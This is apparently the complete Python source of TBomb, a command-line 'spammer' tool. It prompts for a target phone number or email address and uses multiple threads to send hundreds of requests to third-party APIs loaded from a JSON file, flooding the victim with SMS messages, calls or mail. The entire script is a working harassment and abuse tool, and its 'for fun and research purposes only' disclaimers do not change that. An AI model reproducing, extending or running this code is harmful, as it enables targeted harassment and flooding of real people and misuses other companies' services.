#!/usr/bin/python
# -*- coding: UTF-8 -*-

import os, shutil, sys, subprocess
import string, random, json, re
import time, threading
import argparse

from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed


try:
    import requests
    from colorama import Fore, Style
except ImportError:
    print("\tSome dependencies could not be imported (possibly not installed) ")
    print("Type `pip3 install -r requirements.txt` to install all required packages")
    sys.exit(1)

class IconicDecorator(object):
    def __init__(self):
        self.PASS = Style.BRIGHT + Fore.GREEN + "[ ✔ ]" + Style.RESET_ALL
        self.FAIL = Style.BRIGHT + Fore.RED + "[ ✘ ]" + Style.RESET_ALL
        self.WARN = Style.BRIGHT + Fore.YELLOW + "[ ! ]" + Style.RESET_ALL
        self.HEAD = Style.BRIGHT + Fore.CYAN + "[ # ]" + Style.RESET_ALL
        self.CMDL = Style.BRIGHT + Fore.BLUE + "[ → ]" + Style.RESET_ALL
        self.STDS = "     "

class StatusDecorator(object):
    def __init__(self):
        self.PASS = Style.BRIGHT + Fore.GREEN + "[ SUCCESS ]" + Style.RESET_ALL
        self.FAIL = Style.BRIGHT + Fore.RED + "[ FAILURE ]" + Style.RESET_ALL
        self.WARN = Style.BRIGHT + Fore.YELLOW + "[ WARNING ]" + Style.RESET_ALL
        self.HEAD = Style.BRIGHT + Fore.CYAN + "[ SECTION ]" + Style.RESET_ALL
        self.CMDL = Style.BRIGHT + Fore.BLUE + "[ COMMAND ]" + Style.RESET_ALL
        self.STDS = "           "

class MessageDecorator(object):
    def __init__(self, attr):
        ICON = IconicDecorator()
        STAT = StatusDecorator()
        if attr == "icon":
            self.PASS = ICON.PASS
            self.FAIL = ICON.FAIL
            self.WARN = ICON.WARN
            self.HEAD = ICON.HEAD
            self.CMDL = ICON.CMDL
            self.STDS = ICON.STDS
        elif attr == "stat":
            self.PASS = STAT.PASS
            self.FAIL = STAT.FAIL
            self.WARN = STAT.WARN
            self.HEAD = STAT.HEAD
            self.CMDL = STAT.CMDL
            self.STDS = STAT.STDS

    def SuccessMessage(self, RequestMessage):
        print(self.PASS + " " + Style.RESET_ALL + RequestMessage)

    def FailureMessage(self, RequestMessage):
        print(self.FAIL + " " + Style.RESET_ALL + RequestMessage)

    def WarningMessage(self, RequestMessage):
        print(self.WARN + " " + Style.RESET_ALL + RequestMessage)

    def SectionMessage(self, RequestMessage):
        print(self.HEAD + " " + Fore.CYAN + Style.BRIGHT + RequestMessage + Style.RESET_ALL)

    def CommandMessage(self, RequestMessage):
        return self.CMDL + " " + Style.RESET_ALL + RequestMessage

    def GeneralMessage(self, RequestMessage):
        print(self.STDS + " " + Style.RESET_ALL + RequestMessage)


class APIProvider:

    api_providers=[]
    delay = 0
    status = True

    def __init__(self,cc,target,mode,delay=0):
        with open('apidata.json', 'r') as file:
            PROVIDERS = json.load(file)
        self.config = None
        self.cc = cc
        self.target = target
        self.mode = mode
        self.index = 0
        self.lock = threading.Lock()
        APIProvider.delay = delay
        providers=PROVIDERS.get(mode.lower(),{})
        APIProvider.api_providers = providers.get(cc,[])
        if len(APIProvider.api_providers)<10:
            APIProvider.api_providers+=providers.get("multi",[])

    def format(self):
        config_dump = json.dumps(self.config)
        config_dump = config_dump.replace("{target}",self.target).replace("{cc}",self.cc)
        self.config = json.loads(config_dump)

    def select_api(self):
        try:
            self.index = random.choice(range(len(APIProvider.api_providers)))
        except IndexError:
            self.index=-1
            return
        self.config = APIProvider.api_providers[self.index]
        perma_headers = {"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"}
        if "headers" in self.config:
            self.config["headers"].update(perma_headers)
        else:
            self.config["headers"]=perma_headers
        self.format()

    def remove(self):
        try:
            del APIProvider.api_providers[self.index]
            return True
        except:
            return False

    def request(self):
        self.select_api()
        if not self.config or self.index==-1:
            return None
        identifier=self.config.pop("identifier","").lower()
        del self.config['name']
        self.config['timeout']=30
        response=requests.request(**self.config)
        return identifier in response.text.lower()

    def hit(self):
        try:
            if not APIProvider.status:
                return
            time.sleep(APIProvider.delay)
            self.lock.acquire()
            response = self.request()
            if response==False:
                self.remove()
            elif response==None:
                APIProvider.status=False
            return response
        except:
            response=False
        finally:
            self.lock.release()
            return response



def readisdc():
    with open("isdcodes.json") as file:
        isdcodes = json.load(file)
    return isdcodes

def get_version():
    try:
        return open(".version","r").read().strip()
    except:
        return '1.0'

def clr():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

def bann_text():
    clr()
    logo="""
   ████████ █████                 ██
   ▒▒▒██▒▒▒ ██▒▒██                ██
      ██    ██  ██        ██   ██ ██
      ██    █████▒  ████  ███ ███ █████
      ██    ██▒▒██ ██  ██ ██▒█▒██ ██▒▒██
      ██    ██  ██ ██  ██ ██ ▒ ██ ██  ██
      ██    █████▒ ▒████▒ ██   ██ █████▒
      ▒▒    ▒▒▒▒▒   ▒▒▒▒  ▒▒   ▒▒ ▒▒▒▒▒
                                         """
    version="Version: "+__VERSION__
    contributors="Contributors: "+" ".join(__CONTRIBUTORS__)
    print(random.choice(ALL_COLORS) + logo + RESET_ALL)
    mesgdcrt.SuccessMessage(version)
    mesgdcrt.SectionMessage(contributors)
    print()


def check_intr():
    try:
        requests.get("https://motherfuckingwebsite.com")
    except Exception:
        bann_text()
        mesgdcrt.FailureMessage("Poor internet connection detected")
        sys.exit(2)

def format_phone(num):
    num=[n for n in num if n in string.digits]
    return ''.join(num).strip()

def do_zip_update():
    success=False

    # Download Zip from git
    # Unzip and overwrite the current folder

    if success:
        mesgdcrt.SuccessMessage("TBomb was updated to the latest version")
        mesgdcrt.GeneralMessage("Please run the script again to load the latest version")
    else:
        mesgdcrt.FailureMessage("Unable to update TBomb.")
        mesgdcrt.WarningMessage("Grab The Latest one From https://github.com/TheSpeedX/TBomb.git")

    sys.exit()

def do_git_update():
    success=False
    try:
        print(ALL_COLORS[0]+"UPDATING "+RESET_ALL,end='')
        process = subprocess.Popen("git checkout . && git pull ", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        while process:
            print(ALL_COLORS[0]+'.'+RESET_ALL,end='')
            time.sleep(1)
            returncode = process.poll()
            if returncode is not None:
                break
        success = not process.returncode
    except:
        success = False
    print("\n")

    if success:
        mesgdcrt.SuccessMessage("TBomb was updated to the latest version")
        mesgdcrt.GeneralMessage("Please run the script again to load the latest version")
    else:
        mesgdcrt.FailureMessage("Unable to update TBomb.")
        mesgdcrt.WarningMessage("Make Sure To Install 'git' ")
        mesgdcrt.GeneralMessage("Then run command:")
        print("git checkout . && git pull https://github.com/TheSpeedX/TBomb.git HEAD")
    sys.exit()

def update():
    if shutil.which('git'):
        do_git_update()
    else:
        do_zip_update()
def check_for_updates():
    mesgdcrt.SectionMessage("Checking for updates")
    fver = requests.get("https://raw.githubusercontent.com/TheSpeedX/TBomb/master/.version").text.strip()
    if fver != __VERSION__:
        mesgdcrt.WarningMessage("An update is available")
        mesgdcrt.GeneralMessage("Starting update...")
        update()
    else:
        mesgdcrt.SuccessMessage("TBomb is up-to-date")
        mesgdcrt.GeneralMessage("Starting TBomb")

def notifyen():
    try:
        noti = requests.get("https://raw.githubusercontent.com/TheSpeedX/TBomb/master/.notify").text.upper().strip()
        if len(noti) > 10:
            mesgdcrt.SectionMessage("NOTIFICATION: " + noti)
            print()
    except Exception:
        pass

def get_phone_info():
    while True:
        target = ""
        cc = input(mesgdcrt.CommandMessage("Enter your country code (Without +): "))
        cc = format_phone(cc)
        if not country_codes.get(cc,False):
            mesgdcrt.WarningMessage("The country code ({cc}) that you have entered is invalid or unsupported".format(cc=cc))
            continue
        target = input(mesgdcrt.CommandMessage("Enter the target number: +" + cc + " "))
        target = format_phone(target)
        if ((len(target) <= 6) or (len(target) >= 12)):
            mesgdcrt.WarningMessage("The phone number ({target}) that you have entered is invalid".format(target=target))
            continue
        return (cc,target)

def get_mail_info():
    mail_regex='^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w{2,3}$'
    while True:
        target = input(mesgdcrt.CommandMessage("Enter target mail: "))
        if not re.search(mail_regex,target, re.IGNORECASE):
            mesgdcrt.WarningMessage("The mail ({target}) that you have entered is invalid".format(target=target))
            continue
        return target

def pretty_print(cc,target,success,failed):
    requested = success+failed
    mesgdcrt.SectionMessage("Bombing is in progress - Please be patient")
    mesgdcrt.GeneralMessage("Please stay connected to the internet during bombing")
    mesgdcrt.GeneralMessage("Target       : " + cc +" "+ target)
    mesgdcrt.GeneralMessage("Sent         : " + str(requested))
    mesgdcrt.GeneralMessage("Successful   : " + str(success))
    mesgdcrt.GeneralMessage("Failed       : " + str(failed))
    mesgdcrt.WarningMessage("This tool was made for fun and research purposes only")
    mesgdcrt.SuccessMessage("TBomb was created by SpeedX")

def workernode(mode,cc,target,count,delay,max_threads):

    api = APIProvider(cc,target,mode,delay=delay)
    
    clr()
    mesgdcrt.SectionMessage("Gearing up the Bomber - Please be patient")
    mesgdcrt.GeneralMessage("Please stay connected to the internet during bombing")
    mesgdcrt.GeneralMessage("Target        : " + cc + target)
    mesgdcrt.GeneralMessage("Amount        : " + str(count) )
    mesgdcrt.GeneralMessage("Threads       : " + str(max_threads) + " threads")
    mesgdcrt.GeneralMessage("Delay         : " + str(delay) + " seconds")
    mesgdcrt.WarningMessage("This tool was made for fun and research purposes only")
    print()
    input(mesgdcrt.CommandMessage("Press [CTRL+Z] to suspend the bomber or [ENTER] to resume it"))

    if len(APIProvider.api_providers)==0:
        mesgdcrt.FailureMessage("Your country/target is not supported as of now")
        mesgdcrt.GeneralMessage("Feel free to reach out to us")
        input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
        bann_text()
        sys.exit()

    success,failed=0,0
    while success<count:
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            jobs = []
            for i in range(count-success):
                jobs.append(executor.submit(api.hit))

            for job in as_completed(jobs):
                result = job.result()
                if result==None:
                    mesgdcrt.FailureMessage("Bombing limit for your target has been reached")
                    mesgdcrt.GeneralMessage("Try Again Later !!")
                    input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))                   
                    bann_text()
                    sys.exit()
                if result:
                    success+=1
                else:
                    failed+=1
                clr()
                pretty_print(cc,target,success,failed)
    print("\n")
    mesgdcrt.SuccessMessage("Bombing completed!")
    time.sleep(1.5)
    bann_text()
    sys.exit()

def selectnode(mode="sms"):
    mode=mode.lower().strip()
    try:
        clr()
        bann_text()
        check_intr()
        check_for_updates()
        notifyen()

        max_limit={"sms":500,"call":15,"mail":200}
        cc,target="",""
        if mode in ["sms","call"]:
            cc,target=get_phone_info()
            if cc!="91":
                max_limit.update({"sms":100})
        elif mode=="mail":
            target=get_mail_info()
        else:
            raise KeyboardInterrupt


        limit=max_limit[mode]
        while True:
            try:
                message=("Enter number of {type} to send (Max {limit}): ").format(type=mode.upper(),limit=limit)
                count = int(input(mesgdcrt.CommandMessage(message)).strip())
                if count > limit or count==0:
                    mesgdcrt.WarningMessage("You have requested " + str(count) + " {type}".format(type=mode.upper()))
                    mesgdcrt.GeneralMessage("Automatically capping the value to {limit}".format(limit=limit))
                    count = limit
                delay = float(input(mesgdcrt.CommandMessage("Enter delay time (in seconds): ")).strip())
                # delay = 0
                max_threads = int(input(mesgdcrt.CommandMessage("Enter Number of Thread: ")).strip())
                if (count < 0 or delay < 0):
                    raise Exception
                break
            except KeyboardInterrupt as ki:
                raise ki
            except:
                mesgdcrt.FailureMessage("Read Instructions Carefully !!!")
                print()

        workernode(mode,cc,target,count,delay,max_threads)
    except KeyboardInterrupt:
        mesgdcrt.WarningMessage("Received INTR call - Exiting...")
        sys.exit()

if sys.version_info[0]!=3:
    mesgdcrt.FailureMessage("TBomb will work only in Python v3")
    sys.exit()

try:
    country_codes = readisdc()["isdcodes"]
except FileNotFoundError:
    update()

mesgdcrt = MessageDecorator("icon")


__VERSION__ = get_version()
__CONTRIBUTORS__ = ['SpeedX','t0xic0der','scpketer','Stefan']

ALL_COLORS = [Fore.GREEN, Fore.RED, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE]
RESET_ALL = Style.RESET_ALL

description="""TBomb - Your Friendly Spammer Application

TBomb can be used for many purposes which incudes - 
\t Exposing the vulnerable APIs over Internet
\t Friendly Spamming
\t Testing Your Spam Detector and more ....

TBomb is not intented for malicious uses.
"""

parser = argparse.ArgumentParser(description=description,epilog='Coded by SpeedX !!!')
parser.add_argument("-sms","--sms", action="store_true",help="start TBomb with SMS Bomb mode")
parser.add_argument("-call","--call", action="store_true",help="start TBomb with CALL Bomb mode")
parser.add_argument("-mail","--mail", action="store_true",help="start TBomb with MAIL Bomb mode")
parser.add_argument("-u","--update", action="store_true",help="update TBomb")
parser.add_argument("-c","--contributors", action="store_true",help="show current TBomb contributors")
parser.add_argument("-v","--version", action="store_true",help="show current TBomb version")


if __name__ == "__main__":
    args = parser.parse_args()
    if args.version:
        print("Version: ",__VERSION__)
    elif args.contributors:
        print("Contributors: "," ".join(__CONTRIBUTORS__))
    elif args.update:
        update()
    elif args.mail:
        selectnode(mode="mail")
    elif args.call:
        selectnode(mode="call")
    elif args.sms:
        selectnode(mode="sms")
    else:
        choice=""
        avail_choice={"1":"SMS","2":"CALL","3":"MAIL (Coming Soon)"}
        try:
            while (not choice in avail_choice):
                clr()
                bann_text()
                print("Available Options:\n")
                for key,value in avail_choice.items():
                    print("[ {key} ] {value} BOMB".format(key=key,value=value))
                print()
                choice=input(mesgdcrt.CommandMessage("Enter Choice : "))
            selectnode(mode=avail_choice[choice].lower())
        except KeyboardInterrupt:        
            mesgdcrt.WarningMessage("Received INTR call - Exiting...")
            sys.exit()
    sys.exit()
